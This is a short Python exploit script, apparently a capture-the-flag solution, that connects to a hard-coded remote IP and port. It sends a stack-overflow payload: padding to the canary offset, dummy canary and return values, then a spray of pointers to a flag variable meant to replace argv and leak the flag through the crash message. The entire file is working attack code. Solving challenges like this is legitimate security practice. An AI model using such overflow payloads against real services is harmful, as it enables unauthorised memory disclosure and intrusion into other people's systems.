import socket
import struct
import time

def p64(x):
    return struct.pack("<Q", x)

def solve():
    target_host = "34.170.146.252"
    target_port = 19608
    
    # g_flag address
    flag_addr = 0x404040
    
    # password starts at rbp-0x70 (112 bytes).
    # canary at rbp-0x8.
    # offset to canary = 112 - 8 = 104.
    
    payload = b"A" * 104 # padding to canary
    payload += b"B" * 8   # dummy canary
    payload += b"C" * 8   # dummy rbp
    payload += b"D" * 8   # dummy rip
    # Spray flag_addr in the area where argv array is likely to be.
    #argv array is pointers, so we spray pointers to flag.
    payload += p64(flag_addr) * 100 
    
    print(f"Connecting to {target_host}:{target_port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    
    # Receive "Password: "
    data = s.recv(1024)
    print(data.decode(errors='ignore'), end='')
    
    # Send payload
    s.send(payload + b"\n")
    
    # Receive response
    time.sleep(1)
    response = b""
    try:
        while True:
            s.settimeout(2)
            chunk = s.recv(4096)
            if not chunk: break
            response += chunk
    except socket.timeout:
        pass
    
    print("\n--- Output ---")
    print(response.decode(errors='ignore'))
    print("--------------")
    
    s.close()

if __name__ == "__main__":
    solve()
